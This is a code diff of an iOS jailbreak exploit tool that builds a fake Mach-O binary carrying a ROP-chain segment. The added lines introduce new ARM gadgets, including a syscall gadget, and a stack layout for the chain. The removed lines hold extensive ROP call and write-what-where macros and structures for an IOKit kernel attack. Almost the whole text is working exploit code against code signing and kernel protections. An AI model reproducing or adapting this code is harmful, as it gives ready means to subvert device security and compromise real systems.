@@ -17,34 +17,27 @@
 #include <sys/syscall.h>
 #import <Foundation/Foundation.h>
 #import "libxnuexp.h"
-
-
-typedef struct {
-    mach_msg_header_t header;
-    mach_msg_body_t body;
-    mach_msg_ool_descriptor_t desc;
-    mach_msg_trailer_t trailer;
-} oolmsg_t;
-typedef struct {
-    mach_msg_header_t header;
-    mach_msg_body_t body;
-    mach_msg_ool_descriptor_t desc;
-    mach_msg_trailer_t trailer;
-    char oolrcvbuf[4096];
-} oolmsgrcv_t;
+#include "symbols.h"
+#include "defines.h"
 
 #if __LP64__
 #define macho_header			mach_header_64
+#define mach_hdr				struct mach_header_64
 #define LC_SEGMENT_COMMAND		LC_SEGMENT_64
 #define macho_segment_command	segment_command_64
+#define sgmt_cmd				struct segment_command_64
 #define macho_section			section_64
 #define RELOC_SIZE				3
+#define MH_MAGIC_ MH_MAGIC_64
 #else
 #define macho_header			mach_header
+#define mach_hdr				struct mach_header
 #define LC_SEGMENT_COMMAND		LC_SEGMENT
 #define macho_segment_command	segment_command
+#define sgmt_cmd				struct segment_command
 #define macho_section			section
 #define RELOC_SIZE				2
+#define MH_MAGIC_ MH_MAGIC
 #endif
 
 void rebaseDyld(const struct macho_header* mh, intptr_t slide)
@@ -119,6 +112,9 @@ void rebaseDyld(const struct macho_header* mh, intptr_t slide)
     
     
 }
+
+void *g_fake_header = NULL;
+size_t g_fake_header_size = 0x1000;
 
 void *g_text_ptr = NULL;
 size_t g_text_size = 0;
@@ -250,15 +246,15 @@ void dump_dyld_segments(const uint8_t *macho_data)
                     text_file_off_64 = seg->fileoff;
                     text_file_size_64 = seg->filesize-0x1000;
                     
-                    g_text_size = text_file_size_64;
+                    g_text_size = (size_t)text_file_size_64;
                     
-                    g_text_ptr = malloc(text_file_size_64);
+                    g_text_ptr = malloc((size_t)text_file_size_64);
                     if (g_text_ptr == NULL)
                     {
                         NSLog(@"No place for text!");
                     }
                     
-                    memcpy(g_text_ptr, macho_data+text_file_off_64+0x1000, text_file_size_64);
+                    memcpy(g_text_ptr, macho_data+text_file_off_64+0x1000, (size_t)text_file_size_64);
                     
                 } else
                     if (strcmp(seg->segname, "__DATA") == 0)
@@ -266,8 +262,8 @@ void dump_dyld_segments(const uint8_t *macho_data)
                         text_file_off_64 = seg->fileoff;
                         text_file_size_64 = seg->filesize;
                         
-                        g_data_size = text_file_size_64;
-                        g_data_vmsize = seg->vmsize;
+                        g_data_size = (size_t)text_file_size_64;
+                        g_data_vmsize = (size_t)seg->vmsize;
                         
                         g_data_ptr = malloc(g_data_size);
                         if (g_data_ptr == NULL)
@@ -293,15 +289,15 @@ void dump_dyld_segments(const uint8_t *macho_data)
                             text_file_off_64 = seg->fileoff;
                             text_file_size_64 = seg->filesize;
                             
-                            g_lnk_size = text_file_size_64;
+                            g_lnk_size = (size_t)text_file_size_64;
                             
-                            g_lnk_ptr = malloc(text_file_size_64);
+                            g_lnk_ptr = malloc((size_t)text_file_size_64);
                             if (g_text_ptr == NULL)
                             {
                                 NSLog(@"No place for text!");
                             }
                             
-                            memcpy(g_lnk_ptr, macho_data+text_file_off_64, text_file_size_64);
+                            memcpy(g_lnk_ptr, macho_data+text_file_off_64, (size_t)text_file_size_64);
                             
                         }
                 
@@ -312,15 +308,15 @@ void dump_dyld_segments(const uint8_t *macho_data)
                 cs_offset_64 = cscmd->dataoff;
                 cs_size_64 = cscmd->datasize;
                 
-                g_cs_size = cs_size_64;
+                g_cs_size = (size_t)cs_size_64;
                 
-                g_cs_ptr = malloc(cs_size_64);
+                g_cs_ptr = malloc((size_t)cs_size_64);
                 if (g_cs_ptr == NULL)
                 {
                     NSLog(@"no place for cs!");
                 }
                 
-                memcpy(g_cs_ptr, macho_data+cs_offset_64, cs_size_64);
+                memcpy(g_cs_ptr, macho_data+cs_offset_64, (size_t)cs_size_64);
                 
                 NSLog(@"cs_size = %llx", cs_size_64);
             }
@@ -334,6 +330,16 @@ void dump_dyld_segments(const uint8_t *macho_data)
     g_lnk_size = round_page(g_lnk_size);
 }
 
+void dump_dyld_header(uint8_t *header)
+{
+    g_fake_header = malloc(g_fake_header_size);
+    if (g_fake_header == NULL)
+    {
+        NSLog(@"No place for header!");
+    }
+    
+    memcpy(g_fake_header, header, g_fake_header_size);
+}
 
 
 void process_dyld_file(NSString *srcPath)
@@ -362,6 +368,9 @@ void process_dyld_file(NSString *srcPath)
             uint8_t *header = mmap((void*)0x50000000, round_page([myData length]) + 0x5000000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
             memcpy(header, headerc, [myData length]);
             
+            // dump header
+            dump_dyld_header(header);
+            // dump segments
             dump_dyld_segments(header);
             arch++;
         }
@@ -371,11 +380,29 @@ void process_dyld_file(NSString *srcPath)
         [inputHdl seekToFileOffset:0];
         NSData *myData = [inputHdl readDataToEndOfFile];
         const uint8_t *headerc =  [myData bytes];
-        uint8_t *header = mmap((void*)0x50000000, round_page([myData length]) + 0x5000000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
+        void * mem = mmap((void*)0x50000000, round_page([myData length]) + 0x5000000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
+        if ((int)mem == -1) {
+            NSLog(@"Error %s", strerror(errno));
+            exit(1);
+        }
+        uint8_t *header = mem;
         memcpy(header, headerc, [myData length]);
         
+        // dump header
+        dump_dyld_header(header);
+        // dump segments
         dump_dyld_segments(header);
     }
+}
+
+void *local_memcpy_ptrsized(void *dst, const void *src, size_t n)
+{
+    // sanity  check that the length is an even multiple of a pointer size
+    //    assert((n % sizeof(void*)) == 0);
+    for (size_t i=0; i < (n/sizeof(void*)); i++) {
+        ((void**)dst)[i] = ((void**)src)[i];
+    }
+    return dst;
 }
 
 int main(int argc, const char * argv[]) {
@@ -432,9 +459,10 @@ int main(int argc, const char * argv[]) {
     mh.sizeofcmds += dyld_ic.cmdsize;
     mh.ncmds++;
     
+    struct segment_command load_cmd_seg;
+    
     /* FakeTEXT segment */
     
-    struct segment_command load_cmd_seg;
     load_cmd_seg.fileoff = 0x1000;
     load_cmd_seg.filesize = (uint32_t)g_text_size - 0x1000;
     load_cmd_seg.vmsize = (uint32_t)g_text_size;
@@ -456,8 +484,11 @@ int main(int argc, const char * argv[]) {
     
     fsz += load_cmd_seg.filesize + 0x2000;
     
+    // for all next segments
     load_cmd_seg.initprot = PROT_READ|PROT_WRITE; // must be non-EXEC to be usable
     load_cmd_seg.maxprot = PROT_READ|PROT_WRITE; // must be non-EXEC to be usable
+    
+    /* FakeDATA segment */
     
     uint32_t p = fsz;
     load_cmd_seg.vmaddr = 0x4F000000 + fsz;
@@ -474,6 +505,8 @@ int main(int argc, const char * argv[]) {
     
     fsz += load_cmd_seg.filesize;
     
+    /* FakeLINKEDIT segment */
+    
     load_cmd_seg.vmaddr = 0x50000000 + p + g_data_vmsize;
     load_cmd_seg.fileoff = fsz;
     load_cmd_seg.filesize = (uint32_t)g_lnk_size;
@@ -488,6 +521,7 @@ int main(int argc, const char * argv[]) {
     
     fsz += load_cmd_seg.filesize;
     
+    /* __DYLDDATA segment */
     
     load_cmd_seg.vmaddr = 0x50000000 + p;
     load_cmd_seg.fileoff = fsz;
@@ -506,6 +540,7 @@ int main(int argc, const char * argv[]) {
     __unused char *data = (char*)(buf + fsz);
     __unused char *dptr = (char*)(0x5A000000);
     
+    /* __ROPCHAIN segment */
     
     load_cmd_seg.vmaddr = 0x51000000;
     load_cmd_seg.fileoff = fsz;
@@ -515,15 +550,11 @@ int main(int argc, const char * argv[]) {
     memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
     mh.sizeofcmds += load_cmd_seg.cmdsize;
     mh.ncmds++;
-    uint32_t *stack = (uint32*)(buf + fsz + 0x4000);
-    uint32_t *stackz = (uint32*)(buf + fsz + 0x100000 + 0x4000);
-    uint32_t *stacky = (uint32*)(buf + fsz + 0x90000 + 0x4000);
+#define STACK_OFFSET_BASE 0x30000 // 0x4000
+    uint32_t *stack = (uint32*)(buf + fsz + STACK_OFFSET_BASE);
     
     uint32_t *stackbase = stack;
-    uint32_t segstackbase = load_cmd_seg.vmaddr + 0x4000;
-    uint32_t segstackzbase = load_cmd_seg.vmaddr + 0x100000 + 0x4000;
-    uint32_t segstackybase = load_cmd_seg.vmaddr + 0x90000 + 0x4000;
-    
+    uint32_t segstackbase = load_cmd_seg.vmaddr + STACK_OFFSET_BASE;
     
     DeclGadget(mov_sp_r4_pop_r4r7pc, (&(char[]){0xa5,0x46,0x90,0xbd}), 4);
     DeclGadget(mov_r0_r4_pop_r4r7pc, (&(char[]){0x20,0x46,0x90,0xbd}), 4);
@@ -542,1193 +573,218 @@ int main(int argc, const char * argv[]) {
     DeclGadget(str_r0_r4_8_pop_r4r7pc, (&(char[]){0xa0,0x60,0x90,0xbd}), 4);
     DeclGadget(bx_r2_pop_r4r5r7pc, (&(char[]){0x10,0x47,0xb0,0xbd}), 4);
     DeclGadget(bx_r2_add_sp_40_pop_r8r10r11r4r5r6r7pc, (&(char[]){0x10,0x47,0x10,0xB0,0xBD,0xE8,0x00,0x0D,0xF0,0xBD}), 10);
+    DeclGadget(pop_r8r10r11r4r5r6r7pc, (&(char[]){0xBD,0xE8,0x00,0x0D,0xF0,0xBD}), 6);
     DeclGadget(pop_r0r1r3r5r7pc, (&(char[]){0xab,0xbd}), 2);
-    
-    //  DeclGadget(pop_r0r1r2r4r5pc, (&(char[]){0x37,0xbd}), 2);
     
     DeclGadget(pop_r0r1r2r3r5r7pc, (&(char[]){0xaf,0xbd}), 2);
     
-#pragma pack(4)
-    struct mig_set_special_port_req {
-        mach_msg_header_t Head;
-        
-        mach_msg_body_t msgh_body;
-        mach_msg_port_descriptor_t port;
-        
-        NDR_record_t NDR;
-        int which;
-    }  __attribute__((unused));
-    
-#pragma pack()
-#pragma pack(4)
-    
-    struct mig_set_special_port_rep {
-        mach_msg_header_t Head;
-        NDR_record_t NDR;
-        kern_return_t RetCode;
-        mach_msg_trailer_t trailer;
-    }  __attribute__((unused));
-    
-#pragma pack()
-#pragma pack(4)
-    struct mig_set_special_port___rep
-    {
-        mach_msg_header_t Head;
-        NDR_record_t NDR;
-        kern_return_t RetCode;
-    }  __attribute__((unused));
-#pragma pack()
+    // new gadgets by in7egral
+    DeclGadget(lsrs_r0_r0_2_pop_r4r5r7pc, (&(char[]){0x80,0x08,0xB0,0xBD}), 4);
+    DeclGadget(pop_r4r7lr_bx_r1, (&(char[]){0xBD,0xE8,0x90,0x40,0x08,0x47}), 6);
+    DeclGadget(str_r1_r0_4_pop_r4r5r7pc, (&(char[]){0x41,0x60,0xB0,0xBD}), 4);
+    DeclGadget(syscall_80_bx_lr, (&(char[]){0x80,0x00,0x00,0xEF,0x1E,0xFF,0x2F,0xE1}), 8);
+    // stack clear gadgets
+    DeclGadget(add_sp_4_pop_r7pc, (&(char[]){0x01,0xB0,0x80,0xBD}), 4);
+    DeclGadget(add_sp_8_pop_r7pc, (&(char[]){0x02,0xB0,0x80,0xBD}), 4);
+    DeclGadget(add_sp_C_pop_r7pc, (&(char[]){0x03,0xB0,0x80,0xBD}), 4);
+    //add_sp_10_pop_r7pc not found
+    DeclGadget(pop_r10r11_pop_r4r5r7pc, (&(char[]){0xBD,0xE8,0x00,0x0C,0xB0,0xBD}), 6);
+    DeclGadget(add_sp_14_pop_r7pc, (&(char[]){0x05,0xB0,0x80,0xBD}), 4);
+    // for 4 + 8 arguments
+    DeclGadget(add_sp_c_pop_r8r10_pop_r4r5r6r7pc, (&(char[]){0x03,0xB0,0xBD,0xE8,0x00,0x05,0xF0,0xBD}), 8);
+    // read LR gadget
+    DeclGadget(mov_r0_lr_pop_r7pc, (&(char[]){0x70,0x46,0x80,0xBD}), 4);
     
     [dy setSlide:-[dy base] + 0x50000000];
-    
-#define InitMessage  "#yalubreek #unthreadedjb! lol code signatures! %d -qwertyoruiop\n"
-    
-#define StoreR0(push, where) \
-push = (uint32_t)pop_r4r7pc;\
-push = ((uint32_t)where) - 8;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
-push = (uint32_t)0x44444444;\
-push = (uint32_t)m_m_scratch
-    
-#define Shift2R0(push) \
-push = (uint32_t)lsrs_r0_2_popr4r5r7pc;\
-push = (uint32_t)0x44444444;\
-push = (uint32_t)0x45454545;\
-push = (uint32_t)m_m_scratch
-    
-#define WriteWhatWhere(push,what, where)\
-push = (uint32_t)pop_r0r1r3r5r7pc;\
-push = (uint32_t)what;\
-push = (uint32_t)0x11111111;\
-push = (uint32_t)0x22222222;\
-push = (uint32_t)0x45454545;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r4r7pc;\
-push = ((uint32_t)where) - 8;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
-push = (uint32_t)0x44444444;\
-push = (uint32_t)m_m_scratch
-    
-#define LoadIntoR0(push, where)\
-push = (uint32_t)pop_r0r1r3r5r7pc;\
-push = (uint32_t)where - 8;\
-push = (uint32_t)0x11111111;\
-push = (uint32_t)0x33333333;\
-push = (uint32_t)0x45454545; \
-push = (uint32_t)m_m_scratch; \
-push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
-push = (uint32_t)m_m_scratch
-    
-#define DerefR0(push)\
-push = pop_r2pc;\
-push = -8;\
-push = add_r0_r2_pop_r4r5r7pc;\
-push = 0x44444444;\
-push = 0x45454545;\
-push = 0x47474747;\
-push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
-push = (uint32_t)m_m_scratch
-    
-#define RopFixupLR(push) \
-push = (uint32_t)pop_r0r1r2r3r5r7pc;\
-push = (uint32_t)0x40404040; \
-push = (uint32_t)0x41414141; \
-push = (uint32_t)pop_r2pc; \
-push = (uint32_t)0x43434343; \
-push = (uint32_t)0x45454545; \
-push = (uint32_t)(m_m_scratch); \
-push = (uint32_t)bx_r2_add_sp_40_pop_r8r10r11r4r5r6r7pc;\
-push = (uint32_t)0x22222222;\
 
-#define RopNopSlide(push) \
-push = (uint32_t)pop_r7pc;\
-push = (uint32_t)pop_r4r7pc;\
-push = (uint32_t)pop_r7pc;\
-push = (uint32_t)pop_r4r7pc;\
-push = (uint32_t)pop_r7pc;\
-push = (uint32_t)pop_r4r7pc;\
-push = (uint32_t)pop_r7pc;\
-push = (uint32_t)pop_r4r7pc;\
-push = (uint32_t)pop_r7pc;\
-push = (uint32_t)pop_r4r7pc;\
-push = (uint32_t)pop_r7pc;\
-push = (uint32_t)pop_r4r7pc;\
-push = (uint32_t)pop_r7pc;\
-push = (uint32_t)pop_r4r7pc
-    
-#define RopCallFunction10(push, name, a, b, c, d, e, f, g, h, i, l) \
-RopFixupLR(push); \
-push = (uint32_t)pop_r0r1r2r3r5r7pc; \
-push = (uint32_t)a; \
-push = (uint32_t)b; \
-push = (uint32_t)c; \
-push = (uint32_t)d; \
-push = (uint32_t)0x45454545; \
-push = (uint32_t)(m_m_scratch); \
-assert((uint32_t)[dy solveSymbol:name]);\
-push = (uint32_t)[dy solveSymbol:name];\
-push = (uint32_t)e;\
-push = (uint32_t)f;\
-push = (uint32_t)g;\
-push = (uint32_t)h;\
-push = (uint32_t)i;\
-push = (uint32_t)l;\
-RopNopSlide(push)
-    
-#define RopCallFunction9Deref1(push, name, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h, i) RopCallFunctionPointer10Deref1(push,[dy solveSymbol:name], repl_arg_0,read_ptr_0,a,b,c,d,e,f,g,h,i,0)
-#define RopCallFunction10Deref1(push, name, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h, i, l) RopCallFunctionPointer9Deref1(push,[dy solveSymbol:name], repl_arg_0,read_ptr_0,a,b,c,d,e,f,g,h,i,l)
-#define RopCallFunctionPointer10Deref1(push, ptr, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h, i, l) \
-RopFixupLR(push);\
-push = (uint32_t)pop_r0r1r3r5r7pc;\
-push = (uint32_t)read_ptr_0 - 8;\
-push = (uint32_t)0x11111111;\
-push = (uint32_t)0x33333333;\
-push = (uint32_t)0x45454545;\
-push = (uint32_t)m_m_scratch; \
-push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r4r7pc;\
-tmp = ((repl_arg_0 < 4) ? (4*(repl_arg_0 + 6)) : (4*(repl_arg_0 + 9))) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
-push = (uint32_t)tmp  - 8; \
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
-push = (uint32_t)0x44444444;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r0r1r2r3r5r7pc; \
-push = (uint32_t)a; \
-push = (uint32_t)b; \
-push = (uint32_t)c; \
-push = (uint32_t)d; \
-push = (uint32_t)0x45454545; \
-push = (uint32_t)(m_m_scratch); \
-assert((uint32_t)ptr);\
-push = (uint32_t)ptr;\
-push = (uint32_t)e;\
-push = (uint32_t)f;\
-push = (uint32_t)g;\
-push = (uint32_t)h;\
-push = (uint32_t)i;\
-push = (uint32_t)l;\
-push = (uint32_t)0;\
-push = (uint32_t)0;\
-push = (uint32_t)0;\
-push = (uint32_t)0;\
-RopNopSlide(push)
-    
-#define RopCallFunction9Deref2(push, name, repl_arg_0,  read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h, i) RopCallFunctionPointer9Deref2(push,[dy solveSymbol:name], repl_arg_0,read_ptr_0,repl_arg_1,read_ptr_1,a,b,c,d,e,f,g,h,i)
-    
-#define RopCallFunctionPointer9Deref2(push, ptr, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h, i) \
-RopFixupLR(push);\
-push = (uint32_t)pop_r0r1r3r5r7pc;\
-push = (uint32_t)read_ptr_1 - 8;\
-push = (uint32_t)0x11111111;\
-push = (uint32_t)0x33333333;\
-push = (uint32_t)0x45454545;\
-push = (uint32_t)m_m_scratch; \
-push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r4r7pc;\
-tmp = ((repl_arg_1 < 4) ? (4*(14 + repl_arg_1 + 6)) : (4*(14 + repl_arg_1 + 9))) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
-push = (uint32_t)tmp  - 8; \
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
-push = (uint32_t)0x44444444;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r0r1r3r5r7pc;\
-push = (uint32_t)read_ptr_0 - 8;\
-push = (uint32_t)0x11111111;\
-push = (uint32_t)0x33333333;\
-push = (uint32_t)0x45454545;\
-push = (uint32_t)m_m_scratch; \
-push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r4r7pc;\
-tmp = ((repl_arg_0 < 4) ? (4*(repl_arg_0 + 6)) : (4*(repl_arg_0 + 9))) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
-push = (uint32_t)tmp  - 8; \
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
-push = (uint32_t)0x44444444;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r0r1r2r3r5r7pc; \
-push = (uint32_t)a; \
-push = (uint32_t)b; \
-push = (uint32_t)c; \
-push = (uint32_t)d; \
-push = (uint32_t)0x45454545; \
-push = (uint32_t)(m_m_scratch); \
-assert((uint32_t)ptr);\
-push = (uint32_t)ptr;\
-push = (uint32_t)e;\
-push = (uint32_t)f;\
-push = (uint32_t)g;\
-push = (uint32_t)h;\
-push = (uint32_t)i;\
-RopNopSlide(push)
-    
-#define RopCallFunction9Deref3(push, name, repl_arg_0,  read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d, e, f, g, h, i) RopCallFunctionPointer9Deref3(push,[dy solveSymbol:name], repl_arg_0,read_ptr_0,repl_arg_1,read_ptr_1, repl_arg_2, read_ptr_2,a,b,c,d,e,f,g,h,i)
-    
-#define RopCallFunctionPointer9Deref3(push, ptr, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d, e, f, g, h, i) \
-RopFixupLR(push);\
-push = (uint32_t)pop_r0r1r3r5r7pc;\
-push = (uint32_t)read_ptr_2 - 8;\
-push = (uint32_t)0x11111111;\
-push = (uint32_t)0x33333333;\
-push = (uint32_t)0x45454545;\
-push = (uint32_t)m_m_scratch; \
-push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r4r7pc;\
-tmp = ((repl_arg_2 < 4) ? (4*(28 + repl_arg_2 + 6)) : (4*(28 + repl_arg_2 + 9))) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
-push = (uint32_t)tmp  - 8; \
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
-push = (uint32_t)0x44444444;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r0r1r3r5r7pc;\
-push = (uint32_t)read_ptr_1 - 8;\
-push = (uint32_t)0x11111111;\
-push = (uint32_t)0x33333333;\
-push = (uint32_t)0x45454545;\
-push = (uint32_t)m_m_scratch; \
-push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r4r7pc;\
-tmp = ((repl_arg_1 < 4) ? (4*(14 + repl_arg_1 + 6)) : (4*(14 + repl_arg_1 + 9))) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
-push = (uint32_t)tmp  - 8; \
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
-push = (uint32_t)0x44444444;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r0r1r3r5r7pc;\
-push = (uint32_t)read_ptr_0 - 8;\
-push = (uint32_t)0x11111111;\
-push = (uint32_t)0x33333333;\
-push = (uint32_t)0x45454545;\
-push = (uint32_t)m_m_scratch; \
-push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r4r7pc;\
-tmp = ((repl_arg_0 < 4) ? (4*(repl_arg_0 + 6)) : (4*(repl_arg_0 + 9))) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
-push = (uint32_t)tmp  - 8; \
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
-push = (uint32_t)0x44444444;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r0r1r2r3r5r7pc; \
-push = (uint32_t)a; \
-push = (uint32_t)b; \
-push = (uint32_t)c; \
-push = (uint32_t)d; \
-push = (uint32_t)0x45454545; \
-push = (uint32_t)(m_m_scratch); \
-assert((uint32_t)ptr);\
-push = (uint32_t)ptr;\
-push = (uint32_t)e;\
-push = (uint32_t)f;\
-push = (uint32_t)g;\
-push = (uint32_t)h;\
-push = (uint32_t)i;\
-RopNopSlide(push)
-    
-#define RopCallDerefFunctionPointer10Deref2(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h, i, l) \
-RopFixupLR(push);\
-push = (uint32_t)pop_r0r1r3r5r7pc;\
-push = (uint32_t)fptr_deref - 8;\
-push = (uint32_t)0x11111111;\
-push = (uint32_t)0x33333333;\
-push = (uint32_t)0x45454545;\
-push = (uint32_t)m_m_scratch; \
-push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r4r7pc;\
-tmp = (4*(28 + 12)) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
-push = (uint32_t)tmp  - 8; \
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
-push = (uint32_t)0x44444444;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r0r1r3r5r7pc;\
-push = (uint32_t)read_ptr_1 - 8;\
-push = (uint32_t)0x11111111;\
-push = (uint32_t)0x33333333;\
-push = (uint32_t)0x45454545;\
-push = (uint32_t)m_m_scratch; \
-push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r4r7pc;\
-tmp = ((repl_arg_1 < 4) ? (4*(14 + repl_arg_1 + 6)) : (4*(14 + repl_arg_1 + 9))) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
-push = (uint32_t)tmp  - 8; \
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
-push = (uint32_t)0x44444444;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r0r1r3r5r7pc;\
-push = (uint32_t)read_ptr_0 - 8;\
-push = (uint32_t)0x11111111;\
-push = (uint32_t)0x33333333;\
-push = (uint32_t)0x45454545;\
-push = (uint32_t)m_m_scratch; \
-push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r4r7pc;\
-tmp = ((repl_arg_0 < 4) ? (4*(repl_arg_0 + 6)) : (4*(repl_arg_0 + 9))) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
-push = (uint32_t)tmp  - 8; \
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
-push = (uint32_t)0x44444444;\
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r0r1r2r3r5r7pc; \
-push = (uint32_t)a; \
-push = (uint32_t)b; \
-push = (uint32_t)c; \
-push = (uint32_t)d; \
-push = (uint32_t)0x45454545; \
-push = (uint32_t)(m_m_scratch); \
-push = (uint32_t)0x13371337;\
-push = (uint32_t)e;\
-push = (uint32_t)f;\
-push = (uint32_t)g;\
-push = (uint32_t)h;\
-push = (uint32_t)i;\
-push = (uint32_t)l;\
-RopNopSlide(push)
-    
-#define RopCallFunction9(push, name, a, b, c, d, e, f, g, h, i) RopCallFunction10(push, name, a, b, c, d, e, f, g, h, i, 0)
-#define RopCallFunction8(push, name, a, b, c, d, e, f, g, h) RopCallFunction9(push, name, a, b, c, d, e, f, g, h, 0)
-#define RopCallFunction7(push, name, a, b, c, d, e, f, g) RopCallFunction8(push, name, a, b, c, d, e, f, g, 0)
-#define RopCallFunction6(push, name, a, b, c, d, e, f) RopCallFunction7(push, name, a, b, c, d, e, f, 0)
-#define RopCallFunction5(push, name, a, b, c, d, e) RopCallFunction6(push, name, a, b, c, d, e, 0)
-#define RopCallFunction4(push, name, a, b, c, d) RopCallFunction5(push, name, a, b, c, d, 0)
-#define RopCallFunction3(push, name, a, b, c) RopCallFunction4(push, name, a, b, c, 0)
-#define RopCallFunction2(push, name, a, b) RopCallFunction3(push, name, a, b, 0)
-#define RopCallFunction1(push, name, a) RopCallFunction2(push, name, a, 0)
-#define RopCallFunction0(push, name) RopCallFunction1(push, name, 0)
-    
-#define RopAddWrite(push, where, what) \
-LoadIntoR0(push, where);\
-push = pop_r2pc;\
-push = what;\
-push = add_r0_r2_pop_r4r5r7pc;\
-push = 0x44444444;\
-push = 0x45454545;\
-push = 0x47474747;\
-StoreR0(push, where)
-    
-#define RopAddR0(push, what) \
-push = pop_r2pc;\
-push = what;\
-push = add_r0_r2_pop_r4r5r7pc;\
-push = 0x44444444;\
-push = 0x45454545;\
-push = 0x47474747;\
-
-#define RopAddWriteDeref(push, where, whatptr) \
-LoadIntoR0(push, whatptr);\
-push = (uint32_t)pop_r4r7pc;\
-tmp = (4*6) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
-push = (uint32_t)tmp  - 8; \
-push = (uint32_t)m_m_scratch;\
-push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
-push = (uint32_t)0x44444444;\
-push = (uint32_t)m_m_scratch;\
-push = pop_r2pc;\
-push = 0;\
-LoadIntoR0(push, where);\
-push = add_r0_r2_pop_r4r5r7pc;\
-push = 0x44444444;\
-push = 0x45454545;\
-push = 0x47474747;\
-StoreR0(push, where)
-#define kern_uint_t uint64_t
-    
-    struct vm_map_copy {
-        kern_uint_t type;
-        kern_uint_t obj;
-        kern_uint_t sz;
-        kern_uint_t ptr;
-        kern_uint_t kfree_size;
-    } ;
-    
-    typedef struct args {
-        uint32_t cache_slide;
-        uint32_t cache_map;
-        mach_port_t mach_task_self;
-        mach_port_t mach_host_self;
-        mach_port_t master_port;
-        io_service_t svc;
-        io_service_t pmroot_svc;
-        io_iterator_t itr;
-        io_connect_t gasgauge;
-        io_connect_t gasgauge_;
-        io_connect_t rootdomain;
-        kern_return_t io_service_open_return;
-        int _io_service_get_matching_service;
-        int _IOServiceOpen;
-        int _IOServiceClose;
-        int _IOServiceWaitQuiet;
-        int _host_get_io_master;
-        int _io_connect_method_scalarI_structureI;
-        int _io_connect_add_client;
-        int copyaddr;
-        int readaddr;
-        char structData[2048];
-        int structSize;
-        uint64_t inputScalar[1];
-        char initmsg[2048];
-        char testmsg[128];
-        char gasgauge_match[256];
-        char rootdomainuserclient_match[256];
-        char a[256];
-        char b[256];
-        char c[256];
-        char msga[256];
-        char msgb[256];
-        int zero;
-        int fd1;
-        int fd2;
-        int fd3;
